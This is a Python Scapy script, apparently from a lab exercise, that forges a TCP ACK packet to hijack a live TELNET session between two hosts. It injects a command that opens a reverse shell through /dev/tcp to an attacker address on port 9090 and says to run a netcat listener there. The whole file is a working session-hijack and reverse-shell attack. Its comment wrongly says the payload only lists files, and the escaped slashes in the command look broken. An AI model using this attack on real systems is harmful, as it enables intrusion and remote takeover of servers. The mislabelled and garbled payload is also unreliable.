# writted by Ira Garrett 10/8/2025
"""
The purpose of this script is to perform a reverse shell from a session hijacking attack against two targets with a TELNET connection. 
"""

# import libraries
import sys
from scapy.all import *
import datetime

# hijack_attack
"""
Function for sending a crafted packet to hijack the current TELNET connection between two VMs.
Then, use that connection to send a command to the server to be executed.
"""
def hijack_attack(
        server_ip, 
        client_ip, 
        server_port, 
        client_port, 
        next_squence,
        ack
        ):

    # build IP level
    ip = IP(src=client_ip, dst=server_ip)
    
    # build TCP level; A flag is for ACK
    tcp = TCP(  
        sport=int(client_port), 
        dport=int(server_port), 
        flags='A', 
        seq=int(next_squence),
        ack=int(ack)
        )  
    
    # command to be executed on server
    """
        get a list of files in current durectory and send to attacker's machine on port 9090
        Make sure to have nc listening on port 9090 (nc -lvn 9090)
    """
    data = "\r \bin\bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1\r"
    
    # combine IP and TCP layers into a single packet
    pkt = ip/tcp/data                
    ls(pkt)

    # send packet, with verbosity setting to 0 (verbose = 1 is default, showing when packet is sent)
    send(pkt, verbose = 0)      
    print(f"Session Hijack attack sent at {datetime.datetime.now()}")


# main
if __name__ == "__main__":
    SERVER_IP = input("Please enter server IP address:" )
    CLIENT_IP = input("Please enter client IP address:" )
    SERVER_PORT = input("Please enter server port:" )
    CLIENT_PORT = input("Please enter client port:" )
    NEXT_SEQUENCE = input("Please enter next sequence number:" )
    ACK = input("Please enter ack number:" )

    ##              server      client   sport           cport      seq          ack
    hijack_attack(SERVER_IP, CLIENT_IP, SERVER_PORT, CLIENT_PORT, NEXT_SEQUENCE, ACK)